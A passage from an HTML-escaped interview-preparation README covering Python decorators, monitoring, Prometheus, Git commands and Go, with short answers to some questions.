&amp;gt;&amp;gt;&amp;gt; Hi I am the hello_world() function!
    Hi, I'm in!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is the simplest decorator version, it basically saves us from writting &lt;code&gt;a = deco(hello_world())&lt;/code&gt;.
But at this point we can only control the before execution, let's take on the after:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def deco(f):
    def wrapper(*args, **kwargs):
        print("Rick Sanchez!")
        func = f(*args, **kwargs)
        print("I'm in!")
        return func
    return wrapper

@deco
def f(word):
    print(word)

a = f("************")
&amp;gt;&amp;gt;&amp;gt; Rick Sanchez!
    ************
    I'm in!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;deco receives a function -&amp;gt; f
wrapper receives the arguments -&amp;gt; *args, **kwargs&lt;/p&gt;
&lt;p&gt;wrapper returns the function plus the arguments -&amp;gt; f(*args, **kwargs)
deco returns wrapper.&lt;/p&gt;
&lt;p&gt;As you can see we conveniently do things before and after the execution of a given function.&lt;/p&gt;
&lt;p&gt;For example, we could write a decorator that calculates the execution time of a function.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import time
def deco(f):
    def wrapper(*args, **kwargs):
        before = time.time()
        func = f(*args, **kwargs)
        after = time.time()
        print(after-before)
        return func
    return wrapper

@deco
def f():
    time.sleep(2)
    print("************")

a = f()
&amp;gt;&amp;gt;&amp;gt; 2.0008859634399414
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Or create a decorator that executes a function n times.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def n_times(n):
    def wrapper(f):
        def inner(*args, **kwargs):
            for _ in range(n):
                func = f(*args, **kwargs)
            return func
        return inner
    return wrapper

@n_times(4)
def f():
    print("************")

a = f()

&amp;gt;&amp;gt;&amp;gt;************
   ************
   ************
   ************
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Write a decorator that calculates the execution time of a function&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Write a script which will determine if a given host is accessible on a given port&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Are you familiar with Dataclasses? Can you explain what are they used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You wrote a class to represent a car. How would you compare two cars instances if two cars are equal if they have the same model and color?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Context Manager&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Tell me everything you know about concurrency in Python&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the Buffer Protocol&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Descriptors&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Do you have experience with web scraping? Can you describe what have you used and for what?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you implement Linked List in Python?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you implement Linux's &lt;code&gt;tail&lt;/code&gt; command in Python? Bonus: implement &lt;code&gt;head&lt;/code&gt; as well&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You have created a web page where a user can upload a document. But the function which reads the uploaded files, runs for a long time, based on the document size and user has to wait for the read operation to complete before he/she can continue using the web site. How can you overcome this?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How yield works exactly?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-monitoring" class="anchor" aria-hidden="true" href="#monitoring"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Monitoring&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-monitoring-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-14" class="anchor" aria-hidden="true" href="#baby-beginner-14"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain monitoring. What is it? What its goal?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is wrong with the old approach of watching for a specific value and trigger an email/phone alert while value is exceeded?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This approach require from a human to always check why the value exceeded and how to handle it while today, it is more effective to notify people only when they need to take an actual action.
If the issue doesn't require any human intervention, then the problem can be fixed by some processes running in the relevant environment.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What types of monitoring outputs are you familiar with and/or used in the past?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Alerts
Tickets
Logging
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the different between infrastructure monitoring and application monitoring? (methods, tools, ...)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-python-geeks-" class="anchor" aria-hidden="true" href="#python-geeks-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Python Geeks :)&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Tell me something about Python that you think most people don't know&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-prometheus" class="anchor" aria-hidden="true" href="#prometheus"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Prometheus&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-prometheus-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-15" class="anchor" aria-hidden="true" href="#baby-beginner-15"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is Prometheus? What are some of Prometheus's main features?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe Prometheus architecture and components&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Have you set up Prometheus? How did you do it? Describe the process&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you compare Prometheus to other solutions like InfluxDB for example?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an Alert?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe the following Prometheus components:
&lt;ul&gt;
&lt;li&gt;Prometheus server&lt;/li&gt;
&lt;li&gt;Push Gateway&lt;/li&gt;
&lt;li&gt;Alert Manager&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;

&lt;/b&gt;&lt;p&gt;&lt;b&gt;Prometheus server responsible for scraping the storing the data&lt;br&gt;
Push gateway is used for short-lived jobs&lt;br&gt;
Alert manager is responsible for alerts ;)
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is an Instance? What is a Job?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What core metrics types Prometheus supports?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an exporter? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Which Prometheus best practices are you familiar with?. Name at least three&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to get total requests in a given period of time?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What HA in Prometheus means?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-prometheus-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-9" class="anchor" aria-hidden="true" href="#star-advanced-9"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How do you join two metrics?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to write a query that returns the value of a label?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you convert cpu_user_seconds to cpu usage in percentage?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-git" class="anchor" aria-hidden="true" href="#git"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Git&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-git-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-16" class="anchor" aria-hidden="true" href="#baby-beginner-16"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between &lt;code&gt;git pull&lt;/code&gt; and &lt;code&gt;git fetch&lt;/code&gt;?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Shortly, git pull = git fetch + git merge&lt;/p&gt;
&lt;p&gt;When you run git pull, it gets all the changes from the remote or central
repository and attaches it to your corresponding branch in your local repository.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;git fetch gets all the changes from the remote repository, stores the changes in
a separate branch in your local repository
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following: &lt;code&gt;git directory&lt;/code&gt;, &lt;code&gt;working directory&lt;/code&gt; and &lt;code&gt;staging area&lt;/code&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;The Git directory is where Git stores the meta data and object database for your project. This is the most important part of Git, and it is what is copied when you clone a repository from another computer.&lt;/p&gt;
&lt;p&gt;The working directory is a single checkout of one version of the project. These files are pulled out of the compressed database in the Git directory and placed on disk for you to use or modify.&lt;/p&gt;
&lt;p&gt;The staging area is a simple file, generally contained in your Git directory, that stores information about what will go into your next commit. It’s sometimes referred to as the index, but it’s becoming standard to refer to it as the staging area.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This answer taken from &lt;a href="https://git-scm.com/book/en/v1/Getting-Started-Git-Basics#_the_three_states" rel="nofollow"&gt;git-scm.com&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to resolve git merge conflicts?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;
First, you open the files which are in conflict and identify what are the conflicts.
Next, based on what is accepted in your company or team, you either discuss with your
colleagues on the conflicts or resolve them by yourself
After resolving the conflicts, you add the files with `git add `
Finally, you run `git rebase --continue`
&lt;/p&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between &lt;code&gt;git reset&lt;/code&gt; and &lt;code&gt;git revert&lt;/code&gt;?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;
&lt;/p&gt;&lt;p&gt;&lt;code&gt;git revert&lt;/code&gt; creates a new commit which undoes the changes from last commit.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git reset&lt;/code&gt; depends on the usage, can modify the index or change the commit which the branch head
is currently pointing at.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You would like to move forth commit to the top. How would you achieve that?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Using &lt;code&gt;git rebase&amp;gt;&lt;/code&gt; command
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;In what situations are you using &lt;code&gt;git rebase&lt;/code&gt;?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What merge strategies are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Mentioning two or three should be enough and it's probably good to mention that 'recursive' is the default one.&lt;/p&gt;
&lt;p&gt;recursive
resolve
ours
theirs&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This page explains it the best: &lt;a href="https://git-scm.com/docs/merge-strategies" rel="nofollow"&gt;https://git-scm.com/docs/merge-strategies&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How can you see which changes have done before committing them?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;git diff&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How do you revert a specific file to previous commit?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;git checkout HEAD~1 -- /path/of/the/file
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the &lt;code&gt;.git&lt;/code&gt; directory? What can you find there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are some Git anti-patterns? Things that you shouldn't do&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Not waiting to long between commits&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Not removing the .git directory :)
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How do you remove a remote branch?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You delete a remote branch with this syntax:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;git push origin :[branch_name]
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Are you familiar with gitattributes? When would you use it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;gitattributes allow you to define attributes per pathname or path pattern.&lt;br&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can use it for example to control endlines in files. In Windows and Unix based systems, you have different characters for new lines (\r\n and \n accordingly). So using gitattributes we can align it for both Windows and Unix with &lt;code&gt;* text=auto&lt;/code&gt; in .gitattributes for anyone working with git. This is way, if you use the Git project in Windows you'll get \r\n and if you are using Unix or Linux, you'll get \n.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How do you discard local file changes? (before commit)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;git checkout -- &amp;lt;file_name&amp;gt;&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How do you discard local commits?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;git reset HEAD~1&lt;/code&gt; for removing last commit
If you would like to also discard the changes you `git reset --hard``
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;True or False? To remove a file from git but not from the filesystem, one should use &lt;code&gt;git rm &lt;/code&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;False. If you would like to keep a file on your filesystem, use &lt;code&gt;git reset &amp;lt;file_name&amp;gt;&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;a name="user-content-git-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-10" class="anchor" aria-hidden="true" href="#star-advanced-10"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain Git octopus merge&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Probably good to mention that it's:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It's good for cases of merging more than one branch (and also the default of such use cases)&lt;/li&gt;
&lt;li&gt;It's primarily meant for bundling topic branches together&lt;/li&gt;
&lt;/ul&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This is a great article about Octopus merge: &lt;a href="http://www.freblogg.com/2016/12/git-octopus-merge.html" rel="nofollow"&gt;http://www.freblogg.com/2016/12/git-octopus-merge.html&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-go" class="anchor" aria-hidden="true" href="#go"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Go&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-go-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-17" class="anchor" aria-hidden="true" href="#baby-beginner-17"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What are some characteristics of the Go programming language?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;ul&gt;
&lt;li&gt;Strong and static typing - the type of the variables can't be changed over time and they have to be defined at compile time&lt;/li&gt;
&lt;li&gt;Simplicity&lt;/li&gt;
&lt;li&gt;Fast compile times&lt;/li&gt;
&lt;li&gt;Built-in concurrency&lt;/li&gt;
&lt;li&gt;Garbage collected&lt;/li&gt;
&lt;li&gt;Platform independent&lt;/li&gt;
&lt;li&gt;Compile to standalone binary - anything you need to run your app will be compiled into one binary. Very useful for version management in run-time.&lt;/li&gt;
&lt;/ul&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Go also has good community.
